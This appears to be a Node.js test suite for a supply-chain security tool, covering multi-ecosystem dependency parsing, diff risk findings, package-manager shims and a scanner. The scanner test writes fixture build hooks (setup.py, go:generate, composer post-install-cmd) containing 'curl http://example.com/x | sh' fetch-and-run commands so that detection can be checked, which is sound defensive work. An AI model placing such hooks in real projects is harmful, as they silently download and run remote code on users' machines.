'use strict';

const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const test = require('node:test');
const { analyzeCoverage } = require('../lib/coverage');
const { depsDiff, parseLockfile } = require('../lib/deps');
const { reviewPackageSpecs } = require('../lib/deps-review');
const { installNpmGuard, packageSpecsFromArgs, runNpmGuard, shimDir } = require('../lib/npm-guard');
const { dependencyBehaviorAudit } = require('../lib/runtime');
const { scan } = require('../lib/scanner');

function git(cwd, args) {
  return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
}

function initRepo(root) {
  git(root, ['init']);
  git(root, ['config', 'user.email', 'test@example.com']);
  git(root, ['config', 'user.name', 'Test']);
}

function pathEnv(...entries) {
  return entries.join(path.delimiter);
}

function writeFakeCommand(dir, name, marker) {
  fs.mkdirSync(dir, { recursive: true });
  if (process.platform === 'win32') {
    const filePath = path.join(dir, `${name}.cmd`);
    fs.writeFileSync(filePath, `@echo off\r\necho %* > "${marker}"\r\nexit /b 0\r\n`);
    return filePath;
  }
  const filePath = path.join(dir, name);
  fs.writeFileSync(filePath, `#!/bin/sh\necho "$@" > '${marker.replaceAll("'", "'\\''")}'\n`);
  fs.chmodSync(filePath, 0o755);
  return filePath;
}

test('dependency parsers cover Python, Rust, Go, JVM, .NET, PHP, and Ruby manifests', () => {
  const parsed = [
    ...parseLockfile('requirements.txt', 'requests==2.32.0\nhttps://example.com/pkg.whl#egg=direct_pkg\n'),
    ...parseLockfile('pyproject.toml', '[project]\ndependencies = ["httpx==0.27.0"]\n'),
    ...parseLockfile('Cargo.toml', '[dependencies]\nserde = "1.0.0"\ncorp = { git = "https://github.com/acme/corp" }\n'),
    ...parseLockfile('go.mod', 'module app\nrequire github.com/acme/lib v1.2.3\nreplace github.com/acme/lib => ../lib\n'),
    ...parseLockfile('pom.xml', '<project><dependencies><dependency><groupId>org.slf4j</groupId><artifactId>slf4j-api</artifactId><version>2.0.0</version></dependency></dependencies></project>'),
    ...parseLockfile('build.gradle', "dependencies { implementation 'com.google.guava:guava:33.0.0' }\n"),
    ...parseLockfile('app.csproj', '<Project><ItemGroup><PackageReference Include="Newtonsoft.Json" Version="13.0.3" /></ItemGroup></Project>'),
    ...parseLockfile('composer.json', '{"require":{"monolog/monolog":"3.0.0"}}'),
    ...parseLockfile('Gemfile', "gem 'rack', '3.0.0'\n"),
  ];

  assert.ok(parsed.some((dep) => dep.ecosystem === 'python' && dep.name === 'requests'));
  assert.ok(parsed.some((dep) => dep.ecosystem === 'cargo' && dep.name === 'serde'));
  assert.ok(parsed.some((dep) => dep.ecosystem === 'go' && dep.metadata.replace === '../lib'));
  assert.ok(parsed.some((dep) => dep.ecosystem === 'maven' && dep.name === 'org.slf4j:slf4j-api'));
  assert.ok(parsed.some((dep) => dep.ecosystem === 'gradle' && dep.name === 'com.google.guava:guava'));
  assert.ok(parsed.some((dep) => dep.ecosystem === 'nuget' && dep.name === 'Newtonsoft.Json'));
  assert.ok(parsed.some((dep) => dep.ecosystem === 'composer' && dep.name === 'monolog/monolog'));
  assert.ok(parsed.some((dep) => dep.ecosystem === 'bundler' && dep.name === 'rack'));
});

test('dependency diff flags direct go.mod edits including replace and pseudo-version risk', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-go-diff-'));
  initRepo(root);
  fs.writeFileSync(path.join(root, 'go.mod'), 'module app\n');
  git(root, ['add', '.']);
  git(root, ['commit', '-m', 'initial']);
  fs.writeFileSync(path.join(root, 'go.mod'), `module app
require github.com/acme/internal-agent v0.0.0-20260506120000-abcdef123456
replace github.com/acme/internal-agent => http://example.com/agent
`);

  const result = depsDiff(root, { packageManager: 'go' });

  assert.equal(result.ok, false);
  assert.ok(result.findings.some((finding) => finding.id === 'go-module-replace-entry'));
  assert.ok(result.findings.some((finding) => finding.id === 'go-module-pseudo-version'));
  assert.ok(result.added.some((dep) => dep.name === 'github.com/acme/internal-agent'));
});

test('global guard creates shims for supported non-npm package managers', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-multi-guard-home-'));
  installNpmGuard({ home, execFenceBin: path.join(home, 'execfence.js') });
  const dir = shimDir(home);

  for (const name of ['pip', 'pip.cmd', 'uv', 'uv.cmd', 'poetry', 'poetry.cmd', 'cargo', 'cargo.cmd', 'go', 'go.cmd', 'mvn', 'mvn.cmd', 'gradle', 'gradle.cmd', 'dotnet', 'dotnet.cmd', 'composer', 'composer.cmd', 'bundle', 'bundle.cmd']) {
    assert.equal(fs.existsSync(path.join(dir, name)), true, `${name} shim should exist`);
  }
});

test('package guard reviews go get specs and delegates without lifecycle suppression flags', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-go-guard-'));
  const realDir = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-real-go-'));
  const marker = path.join(root, 'go-called.txt');
  writeFakeCommand(realDir, 'go', marker);
  fs.writeFileSync(path.join(root, 'go.mod'), 'module app\n');

  const result = runNpmGuard('go', ['get', 'github.com/acme/lib@v1.2.3'], {
    cwd: root,
    home: root,
    env: { PATH: pathEnv(realDir) },
    stdio: 'pipe',
    supplyChain: { metadata: { enabled: false }, reputation: { enabled: false } },
  });

  assert.equal(result.ok, true);
  assert.deepEqual(packageSpecsFromArgs('go', ['get', 'github.com/acme/lib@v1.2.3']), ['github.com/acme/lib@v1.2.3']);
  assert.doesNotMatch(fs.readFileSync(marker, 'utf8'), /ignore-scripts/);
});

test('runtime dependency behavior audit treats go generate as high-risk without containment', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-go-runtime-'));
  initRepo(root);
  fs.writeFileSync(path.join(root, 'go.mod'), 'module app\n');
  git(root, ['add', '.']);
  git(root, ['commit', '-m', 'initial']);
  fs.writeFileSync(path.join(root, 'go.mod'), 'module app\nrequire github.com/acme/lib v1.2.3\n');

  const result = dependencyBehaviorAudit(root, ['go', 'generate'], { options: { supplyChain: { metadata: { enabled: false }, reputation: { enabled: false } } } });

  assert.equal(result.ok, false);
  assert.ok(result.containmentFindings.some((finding) => finding.id === 'dependency-runtime-containment-missing' && finding.severity === 'high'));
});

test('scanner flags setup.py, build.rs, go generate, and composer script execution surfaces', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-multi-scan-'));
  fs.writeFileSync(path.join(root, 'setup.py'), 'import os\nos.system("curl http://example.com/x | sh")\n');
  fs.writeFileSync(path.join(root, 'build.rs'), 'std::process::Command::new("sh").arg("-c").arg("curl x").status();\n');
  fs.writeFileSync(path.join(root, 'main.go'), 'package main\n//go:generate sh -c "curl http://example.com/x | sh"\n');
  fs.writeFileSync(path.join(root, 'composer.json'), '{"scripts":{"post-install-cmd":"curl http://example.com/x | sh"}}');

  const result = scan({ cwd: root, roots: [root] });

  assert.equal(result.ok, false);
  assert.ok(result.findings.some((finding) => finding.id === 'suspicious-python-build-script'));
  assert.ok(result.findings.some((finding) => finding.id === 'suspicious-rust-build-script'));
  assert.ok(result.findings.some((finding) => finding.id === 'suspicious-go-generate'));
  assert.ok(result.findings.some((finding) => finding.id === 'suspicious-composer-script'));
});

test('strict coverage reports package-manager surfaces for non-npm ecosystems', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-multi-coverage-'));
  fs.mkdirSync(path.join(root, '.execfence', 'config'), { recursive: true });
  fs.writeFileSync(path.join(root, '.execfence', 'config', 'execfence.json'), JSON.stringify({
    supplyChain: { mode: 'strict', metadata: { enabled: false } },
  }, null, 2));
  fs.writeFileSync(path.join(root, 'go.mod'), 'module app\n');
  fs.writeFileSync(path.join(root, 'Cargo.toml'), '[dependencies]\nserde = "1"\n');
  fs.writeFileSync(path.join(root, 'pyproject.toml'), '[project]\ndependencies = ["requests"]\n');
  fs.writeFileSync(path.join(root, 'composer.lock'), '{"packages":[]}');

  const result = analyzeCoverage(root);

  assert.equal(result.ok, false);
  assert.ok(result.uncovered.some((entry) => entry.type === 'package-manager-surface' && entry.name === 'go'));
  assert.ok(result.uncovered.some((entry) => entry.type === 'package-manager-surface' && entry.name === 'cargo'));
  assert.ok(result.uncovered.some((entry) => entry.type === 'package-manager-surface' && entry.name === 'pip'));
  assert.ok(result.uncovered.some((entry) => entry.type === 'package-manager-surface' && entry.name === 'composer'));
});
